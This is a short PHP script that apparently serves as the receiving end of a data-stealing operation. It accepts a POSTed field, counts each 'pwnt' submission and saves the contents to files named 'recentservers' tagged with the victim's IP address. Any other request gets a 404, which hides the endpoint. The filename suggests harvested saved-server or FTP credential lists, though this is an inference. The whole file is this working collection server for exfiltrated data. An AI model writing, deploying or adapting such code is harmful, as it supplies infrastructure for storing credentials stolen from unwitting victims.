<?php
      if( isset($_POST['a']) ){
        
        $logfile = 'log.txt';
        $number = file_get_contents($logfile);

        $number++; //increment number of pwnt

        file_put_contents($logfile, $number); //save last number of pwnt

        $ipAddress = $_SERVER['REMOTE_ADDR'];
        $contents = $_POST['a'];

        //write the file with the contents. The file is located at pwnt/recentservers-$number_($ipAddress).txt
        $fp = fopen('pwnt/recentservers-'.$number.'_('.$ipAddress.').txt','a+');
        $fwrite = fwrite($fp, $contents);
      
      }
      else {
        http_response_code(404);
      }
?>